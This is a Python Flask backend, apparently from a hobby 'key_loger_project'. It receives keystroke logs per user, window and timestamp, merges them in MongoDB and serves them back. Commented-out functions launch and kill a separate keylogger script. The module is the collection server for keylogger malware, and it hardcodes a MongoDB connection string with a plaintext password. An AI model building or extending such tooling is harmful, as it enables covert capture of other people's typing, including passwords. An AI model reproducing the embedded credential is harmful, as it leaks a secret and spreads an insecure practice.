import os
import subprocess
from flask import request, jsonify
import signal
from pymongo import MongoClient

client = MongoClient("mongodb+srv://haimassraf:Aa123456@cluster0.s8vwr.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
db = client["key_loger_project"]
data_collection = db["data"]

def get_data():
    users = list(data_collection.find({}, {"_id": 0}))
    return jsonify(users), 200

def add_data():
    try:
        data = request.json
        for user, windows in data.items():
            for window, timestamps in windows.items():
                existing_entry = data_collection.find_one({"user": user, "window": window})
                if existing_entry:
                    for timestamp, value in timestamps.items():
                        new_value = existing_entry["timestamps"].get(timestamp, "") + value
                        data_collection.update_one(
                            {"user": user, "window": window},
                            {"$set": {f"timestamps.{timestamp}": new_value}}
                        )
                else:
                    data_collection.insert_one({
                        "user": user,
                        "window": window,
                        "timestamps": timestamps
                    })

        updated_data = data_collection.find_one({"user": user, "window": window}, {"_id": 0})
        return jsonify({"message": "Data updated successfully!", "Updated data": updated_data}), 201

    except Exception as err:
        return jsonify({"error": str(err)}), 500


# process = None
# def start_keylogger():
#     global process
#     if process is None:
#         process = subprocess.Popen(['python', '../key_logger/keylogger.py'])
#         return jsonify({"status": "Keylogger started"}), 200
#     return jsonify({"status": "Keylogger already running"}), 400
#
# def stop_keylogger():
#     global process
#     if process is not None:
#         os.kill(process.pid, signal.SIGTERM)
#         process = None
#         return jsonify({"status": "Keylogger stopped"}), 200
#     return jsonify({"status": "Keylogger is not running"}), 400
